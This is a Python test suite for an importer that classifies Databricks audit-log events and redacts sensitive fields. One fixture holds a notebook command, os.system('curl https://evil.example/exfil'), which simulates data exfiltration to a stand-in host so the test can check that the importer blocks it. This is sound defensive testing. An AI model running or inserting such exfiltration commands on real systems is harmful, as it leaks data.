"""Tests for the Databricks audit-log importer.

Fixture builders mirror the actual Databricks audit-log shape (system.access.audit
or workspace audit log). All sanitization invariants are tested explicitly:
query text is never stored, request_params values are never stored, source IPs
are masked, emails are reduced to domain only, and user agents are
prefix+sha256 redacted.
"""

from __future__ import annotations

import json

from ancilis.importers.databricks import DatabricksImporter


# ---------------------------------------------------------------------------
# Fixture builder — inline records (no databricks-sdk required)
# ---------------------------------------------------------------------------


def _event(
    *,
    event_id: str = "01b3a1c2-aaaa-4321-bbbb-deadbeef0001",
    event_time: str = "2026-04-01T12:00:00+00:00",
    workspace_id: str = "1234567890123456",
    account_id: str = "acct-aaaa-bbbb",
    service_name: str = "workspace",
    action_name: str = "login",
    user_email: str = "agent@example.com",
    user_type: str = "user",
    source_ip: str = "10.0.0.5",
    user_agent: str = "databricks-sdk-python/0.10.0 (Linux x86_64)",
    session_id: str = "sess-aaaaaaaa-12345678",
    request_id: str = "req-1111",
    request_params: dict | None = None,
    response_status_code: int = 200,
    response_error_message_length: int = 0,
    response_result: object = None,
    audit_level: str = "WORKSPACE_LEVEL",
    is_compute_attached: bool = False,
    compute_kind: str = "",
    is_genai_use_case: bool = False,
) -> dict:
    rec: dict = {
        "event_id": event_id,
        "event_time": event_time,
        "workspace_id": workspace_id,
        "account_id": account_id,
        "service_name": service_name,
        "action_name": action_name,
        "user_identity": {"email": user_email, "type": user_type},
        "source_ip_address": source_ip,
        "user_agent": user_agent,
        "session_id": session_id,
        "request_id": request_id,
        "request_params": request_params or {},
        "response": {
            "status_code": response_status_code,
            "error_message_length": response_error_message_length,
        },
        "audit_level": audit_level,
        "is_compute_attached": is_compute_attached,
        "compute_kind": compute_kind,
        "is_genai_use_case": is_genai_use_case,
    }
    if response_result is not None:
        rec["response"]["result"] = response_result
    return rec


def _signals(result) -> list[str]:
    return [cr.evidence_data.get("signal") for cr in result.control_results]


# ---------------------------------------------------------------------------
# 1. workspace.login + 200 → PR-01 PASS
# ---------------------------------------------------------------------------


def test_workspace_login_passes() -> None:
    doc = json.dumps(
        {"events": [_event(action_name="login", response_status_code=200)]}
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "ALLOW"
    assert "login_success" in _signals(r)
    cr = next(c for c in r.control_results if c.evidence_data.get("signal") == "login_success")
    assert cr.result == "PASS"
    assert cr.control_id == "PR-01"


# ---------------------------------------------------------------------------
# 2. jobs.runJobNow → PR-05 PASS (audit job execution)
# ---------------------------------------------------------------------------


def test_jobs_run_job_now_audit() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="jobs",
                    action_name="runJobNow",
                    request_params={"job_id": "9876"},
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "ALLOW"
    assert "job_run" in _signals(r)
    cr = next(c for c in r.control_results if c.evidence_data.get("signal") == "job_run")
    assert cr.result == "PASS"
    assert cr.control_id == "PR-05"


# ---------------------------------------------------------------------------
# 3. clusters.createCluster + GPU node_type → PR-04 FLAG
# ---------------------------------------------------------------------------


def test_gpu_cluster_flags() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="clusters",
                    action_name="createCluster",
                    request_params={
                        "node_type_id": "g4dn.xlarge",
                        "cluster_name": "agent-training",
                    },
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "FLAG"
    assert "cluster_create_gpu" in _signals(r)
    cr = next(
        c
        for c in r.control_results
        if c.evidence_data.get("signal") == "cluster_create_gpu"
    )
    assert cr.result == "FLAG"
    assert cr.control_id == "PR-04"
    assert cr.evidence_data["node_type_id"] == "g4dn.xlarge"


# ---------------------------------------------------------------------------
# 4. unityCatalog.deleteTable → PR-02 FAIL
# ---------------------------------------------------------------------------


def test_unitycatalog_delete_table_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="unityCatalog",
                    action_name="deleteTable",
                    request_params={
                        "full_name_arg": "prod.analytics.customers",
                    },
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    assert "uc_delete_table" in _signals(r)
    cr = next(c for c in r.control_results if c.evidence_data.get("signal") == "uc_delete_table")
    assert cr.result == "FAIL"
    assert cr.control_id == "PR-02"


# ---------------------------------------------------------------------------
# 5. unityCatalog.grantPermission with ALL_PRIVILEGES → PR-02 FAIL
# ---------------------------------------------------------------------------


def test_unitycatalog_grant_allprivileges_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="unityCatalog",
                    action_name="grantPermission",
                    request_params={
                        "permission": "ALL_PRIVILEGES",
                        "principal": "agents@example.com",
                    },
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    assert "uc_grant_admin" in _signals(r)
    cr = next(c for c in r.control_results if c.evidence_data.get("signal") == "uc_grant_admin")
    assert cr.result == "FAIL"
    assert cr.control_id == "PR-02"


# ---------------------------------------------------------------------------
# 6. mlflow.transitionModelVersionStage → Production with no approver → FAIL
# ---------------------------------------------------------------------------


def test_mlflow_auto_prod_promote_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="mlflow",
                    action_name="transitionModelVersionStage",
                    request_params={
                        "name": "fraud-detector",
                        "version": "7",
                        "new_stage": "Production",
                    },
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    assert "mlflow_auto_promote_production" in _signals(r)
    cr = next(
        c
        for c in r.control_results
        if c.evidence_data.get("signal") == "mlflow_auto_promote_production"
    )
    assert cr.result == "FAIL"
    assert cr.control_id == "PR-02"


def test_mlflow_promote_with_approver_passes() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="mlflow",
                    action_name="transitionModelVersionStage",
                    request_params={
                        "name": "fraud-detector",
                        "version": "7",
                        "new_stage": "Production",
                        "approver": "alice@example.com",
                    },
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "ALLOW"
    assert "mlflow_transition_stage" in _signals(r)


# ---------------------------------------------------------------------------
# 7. mlflow.createServingEndpoint → PR-01 FLAG
# ---------------------------------------------------------------------------


def test_mlflow_serving_endpoint_flags() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="mlflow",
                    action_name="createServingEndpoint",
                    request_params={"name": "fraud-detector-prod"},
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "FLAG"
    assert "mlflow_serving_endpoint" in _signals(r)
    cr = next(
        c
        for c in r.control_results
        if c.evidence_data.get("signal") == "mlflow_serving_endpoint"
    )
    assert cr.result == "FLAG"
    assert cr.control_id == "PR-01"


# ---------------------------------------------------------------------------
# 8. notebook.runCommand with shell-out patterns → PR-03 FAIL
# ---------------------------------------------------------------------------


def test_notebook_shell_out_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="notebook",
                    action_name="runCommand",
                    request_params={"language": "python"},
                    response_result=(
                        "import os\nos.system('curl https://evil.example/exfil')\n"
                    ),
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    assert "notebook_shell_out" in _signals(r)
    cr = next(
        c
        for c in r.control_results
        if c.evidence_data.get("signal") == "notebook_shell_out"
    )
    assert cr.result == "FAIL"
    assert cr.control_id == "PR-03"
    # The matched substring must be a categorical pattern, not the raw text.
    assert "os.system" in cr.evidence_data["shell_out_pattern_categories"]
    # Notebook content (raw response.result) must NOT be stored.
    serialized = json.dumps(cr.evidence_data, default=str)
    assert "evil.example" not in serialized
    assert "import os" not in serialized
    # Only the presence indicator should be present.
    assert cr.evidence_data["response_result_present"] is True


# ---------------------------------------------------------------------------
# 9. vectorSearch.query → PR-04 PASS
# ---------------------------------------------------------------------------


def test_vector_search_query_passes() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="vectorSearch",
                    action_name="query",
                    request_params={"index_name": "products"},
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "ALLOW"
    assert "vector_search_query" in _signals(r)
    cr = next(
        c
        for c in r.control_results
        if c.evidence_data.get("signal") == "vector_search_query"
    )
    assert cr.result == "PASS"
    assert cr.control_id == "PR-04"


# ---------------------------------------------------------------------------
# 10. dlt.startUpdate (Delta Live Tables pipeline) → PR-05 PASS but captured
# ---------------------------------------------------------------------------


def test_dlt_pipeline_audit() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="dlt",
                    action_name="startUpdate",
                    request_params={
                        "pipeline_id": "abc-123",
                        "full_refresh": "false",
                    },
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "ALLOW"
    assert "dlt_start_update" in _signals(r)
    cr = next(c for c in r.control_results if c.evidence_data.get("signal") == "dlt_start_update")
    assert cr.result == "PASS"
    assert cr.control_id == "PR-05"


# ---------------------------------------------------------------------------
# 11. response.status_code=403 → PR-02 PASS (correctly denied)
# ---------------------------------------------------------------------------


def test_status_403_passes() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="unityCatalog",
                    action_name="deleteTable",
                    response_status_code=403,
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "ALLOW"
    assert "access_denied" in _signals(r)
    cr = next(c for c in r.control_results if c.evidence_data.get("signal") == "access_denied")
    assert cr.result == "PASS"
    assert cr.control_id == "PR-02"


# ---------------------------------------------------------------------------
# 12. audit_level=ACCOUNT_LEVEL + admin action → PR-02 FLAG
# ---------------------------------------------------------------------------


def test_audit_level_account_admin_flags() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="accounts",
                    action_name="createServicePrincipal",
                    audit_level="ACCOUNT_LEVEL",
                    request_params={"display_name": "deploy-bot"},
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "FLAG"
    assert "account_admin_action" in _signals(r)
    cr = next(
        c
        for c in r.control_results
        if c.evidence_data.get("signal") == "account_admin_action"
    )
    assert cr.result == "FLAG"
    assert cr.control_id == "PR-02"


# ---------------------------------------------------------------------------
# 13. Cross-workspace synthetic finding
# ---------------------------------------------------------------------------


def test_cross_workspace_synthetic() -> None:
    events = [
        _event(
            event_id=f"evt-{i:04d}",
            workspace_id=f"ws-{i:04d}",
            user_email="agent@example.com",
        )
        for i in range(5)  # 5 distinct workspaces > threshold of 3
    ]
    doc = json.dumps({"events": events})
    results = DatabricksImporter().parse_string(doc)
    synthetics = [
        r
        for r in results
        if any(
            cr.evidence_data.get("signal") == "cross_workspace_pattern"
            and cr.evidence_data.get("synthetic") is True
            for cr in r.control_results
        )
    ]
    assert len(synthetics) == 1
    syn = synthetics[0]
    assert syn.decision == "FLAG"
    cr = syn.control_results[0]
    assert cr.control_id == "PR-02"
    assert cr.evidence_data["email_domain"] == "example.com"
    assert cr.evidence_data["cross_workspace_workspace_count"] == 5


# ---------------------------------------------------------------------------
# 14. Cluster-creation burst synthetic finding
# ---------------------------------------------------------------------------


def test_cluster_creation_burst_synthetic() -> None:
    events = [
        _event(
            event_id=f"evt-{i:04d}",
            event_time=f"2026-04-01T12:{i:02d}:00+00:00",
            service_name="clusters",
            action_name="createCluster",
            user_email="agent@example.com",
            request_params={"node_type_id": "Standard_DS3_v2"},
        )
        for i in range(15)  # 15 createCluster within 1h > threshold of 10
    ]
    doc = json.dumps({"events": events})
    results = DatabricksImporter().parse_string(doc)
    synthetics = [
        r
        for r in results
        if any(
            cr.evidence_data.get("signal") == "cluster_creation_burst"
            and cr.evidence_data.get("synthetic") is True
            for cr in r.control_results
        )
    ]
    assert len(synthetics) == 1
    syn = synthetics[0]
    assert syn.decision == "FLAG"
    cr = syn.control_results[0]
    assert cr.control_id == "PR-04"
    assert cr.evidence_data["cluster_burst_count"] == 15


# ---------------------------------------------------------------------------
# 15. Query text never stored — sanitization invariant
# ---------------------------------------------------------------------------


def test_query_text_not_stored() -> None:
    sensitive_sql = (
        "SELECT ssn, dob FROM customer_data.pii WHERE customer_id='SECRET-CUSTOMER-12345'"
    )
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="sql",
                    action_name="executeQuery",
                    request_params={
                        "statement": sensitive_sql,
                        "warehouse_id": "wh-abc",
                    },
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    serialized = json.dumps(
        [cr.evidence_data for cr in r.control_results], default=str
    )
    assert "SECRET-CUSTOMER-12345" not in serialized
    assert "customer_data.pii" not in serialized
    assert "ssn" not in serialized
    # query_text_length should be the integer length (computed from the
    # in-memory string, NOT the text).
    cr = r.control_results[0]
    assert cr.evidence_data["query_text_length"] == len(sensitive_sql)
    # Only the keys should be surfaced, not the values.
    assert cr.evidence_data["request_params_keys"] == sorted(
        ["statement", "warehouse_id"]
    )


# ---------------------------------------------------------------------------
# 16. Request-params values never stored — sanitization invariant
# ---------------------------------------------------------------------------


def test_request_params_values_not_stored() -> None:
    secret_token = "dapi-fake-secret-token-9999"
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="jobs",
                    action_name="runJobNow",
                    request_params={
                        "job_id": "12345",
                        "personal_access_token": secret_token,
                        "git_credential_token": "gh_fake_token_aaaa",
                    },
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    serialized = json.dumps(
        [cr.evidence_data for cr in r.control_results], default=str
    )
    # No raw secret values may appear anywhere in the evidence.
    assert secret_token not in serialized
    assert "gh_fake_token_aaaa" not in serialized
    # Keys ARE preserved (operationally useful).
    cr = r.control_results[0]
    assert cr.evidence_data["request_params_keys"] == sorted(
        ["job_id", "personal_access_token", "git_credential_token"]
    )


# ---------------------------------------------------------------------------
# 17. Source IP is masked (/16) — sanitization invariant
# ---------------------------------------------------------------------------


def test_ip_redacted() -> None:
    public_ip = "8.8.4.4"
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="workspace",
                    action_name="login",
                    source_ip=public_ip,
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    cr = r.control_results[0]
    # Public IPv4 must be reduced to /16.
    assert cr.evidence_data["source_ip_masked"] == "8.8.0.0/16"
    # The full last-octet form must not appear in any control evidence.
    for c in r.control_results:
        serialized = json.dumps(c.evidence_data, default=str)
        assert public_ip not in serialized


# ---------------------------------------------------------------------------
# 18. Email reduced to domain only — sanitization invariant
# ---------------------------------------------------------------------------


def test_email_domain_only() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="workspace",
                    action_name="login",
                    user_email="acme-prod-customer-bot@example.com",
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    serialized = json.dumps(
        [cr.evidence_data for cr in r.control_results], default=str
    )
    # The local-part (which leaks tenant/customer context) must not appear.
    assert "acme-prod-customer-bot" not in serialized
    cr = r.control_results[0]
    assert cr.evidence_data["email_domain"] == "example.com"


# ---------------------------------------------------------------------------
# 19. user_agent is prefix+sha256 redacted
# ---------------------------------------------------------------------------


def test_user_agent_redacted() -> None:
    long_ua = (
        "databricks-sdk-python/0.10.0 (Linux x86_64) "
        "extra-token-secret-xxxx-very-long-agent-string-aaaaaaaaaaaaaaaaaaaaaaaa"
    )
    doc = json.dumps(
        {
            "events": [_event(service_name="workspace", action_name="login", user_agent=long_ua)]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    cr = r.control_results[0]
    redacted = cr.evidence_data["user_agent_redacted"]
    assert isinstance(redacted, dict)
    assert len(redacted["prefix"]) <= 80
    assert "sha256" in redacted
    assert len(redacted["sha256"]) == 64


# ---------------------------------------------------------------------------
# 20. JSONL parsing works
# ---------------------------------------------------------------------------


def test_jsonl_parsing() -> None:
    e1 = _event(event_id="evt-001", action_name="login")
    e2 = _event(
        event_id="evt-002",
        service_name="jobs",
        action_name="runJobNow",
    )
    jsonl = "\n".join([json.dumps(e1), json.dumps(e2)])
    results = DatabricksImporter().parse_string(jsonl)
    assert len(results) == 2
    assert any("login_success" in _signals(r) for r in results)
    assert any("job_run" in _signals(r) for r in results)


# ---------------------------------------------------------------------------
# 21. response.status_code=500 → DE-01 FAIL
# ---------------------------------------------------------------------------


def test_status_500_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="jobs",
                    action_name="runJobNow",
                    response_status_code=500,
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    assert "execution_failure" in _signals(r)
    cr = next(c for c in r.control_results if c.evidence_data.get("signal") == "execution_failure")
    assert cr.result == "FAIL"
    assert cr.control_id == "DE-01"


# ---------------------------------------------------------------------------
# 22. SQL executeQuery with destructive statement → PR-02 FLAG
# ---------------------------------------------------------------------------


def test_sql_destructive_statement_flags() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="sql",
                    action_name="executeQuery",
                    request_params={
                        "statement": "DROP TABLE prod.analytics.transactions",
                        "warehouse_id": "wh-1",
                    },
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "FLAG"
    assert "sql_execute_destructive" in _signals(r)
    cr = next(
        c
        for c in r.control_results
        if c.evidence_data.get("signal") == "sql_execute_destructive"
    )
    assert cr.result == "FLAG"
    assert cr.control_id == "PR-02"


# ---------------------------------------------------------------------------
# 23. genie service or is_genai_use_case=true → genai_workload PASS
# ---------------------------------------------------------------------------


def test_genai_workload_captured() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="sql",
                    action_name="executeQuery",
                    request_params={"warehouse_id": "wh-1"},
                    is_genai_use_case=True,
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert "genai_workload" in _signals(r)


# ---------------------------------------------------------------------------
# 24. cluster_source=API by service principal captured
# ---------------------------------------------------------------------------


def test_cluster_create_api_service_principal_captured() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="clusters",
                    action_name="createCluster",
                    user_email="bot@example.com",
                    user_type="service_principal",
                    request_params={
                        "node_type_id": "Standard_DS3_v2",
                        "cluster_source": "API",
                    },
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert "cluster_create_api_sp" in _signals(r)
    cr = next(
        c
        for c in r.control_results
        if c.evidence_data.get("signal") == "cluster_create_api_sp"
    )
    assert cr.result == "PASS"
    assert cr.control_id == "PR-05"


# ---------------------------------------------------------------------------
# 25. notebook.updateNotebook by service principal — captured
# ---------------------------------------------------------------------------


def test_notebook_update_service_principal() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="notebook",
                    action_name="updateNotebook",
                    user_type="service_principal",
                    user_email="agent-bot@example.com",
                    request_params={"path": "/Repos/agent/main"},
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert "notebook_update_service_principal" in _signals(r)


# ---------------------------------------------------------------------------
# 26. unityCatalog.createSchema → PR-05 PASS
# ---------------------------------------------------------------------------


def test_unitycatalog_create_schema_audit() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="unityCatalog",
                    action_name="createSchema",
                    request_params={"name": "analytics_v2"},
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert "uc_schema_create" in _signals(r)
    cr = next(c for c in r.control_results if c.evidence_data.get("signal") == "uc_schema_create")
    assert cr.result == "PASS"
    assert cr.control_id == "PR-05"


# ---------------------------------------------------------------------------
# 27. feature.publishFeature → PR-05 FLAG
# ---------------------------------------------------------------------------


def test_feature_publish_flags() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    service_name="feature",
                    action_name="publishFeature",
                    request_params={"feature_table": "fraud.features.user_v2"},
                )
            ]
        }
    )
    [r] = DatabricksImporter().parse_string(doc)
    assert r.decision == "FLAG"
    assert "feature_publish" in _signals(r)
    cr = next(c for c in r.control_results if c.evidence_data.get("signal") == "feature_publish")
    assert cr.result == "FLAG"


# ---------------------------------------------------------------------------
# 28. Source provenance — file sha256 surfaces when parse() is used
# ---------------------------------------------------------------------------


def test_source_provenance_file_sha256(tmp_path) -> None:
    p = tmp_path / "audit.json"
    p.write_text(json.dumps({"events": [_event()]}))
    [r] = DatabricksImporter().parse(p)
    cr = r.control_results[0]
    prov = cr.evidence_data["source_provenance"]
    assert prov["source_format"] == "databricks"
    assert "original_file_sha256" in prov
    assert len(prov["original_file_sha256"]) == 64
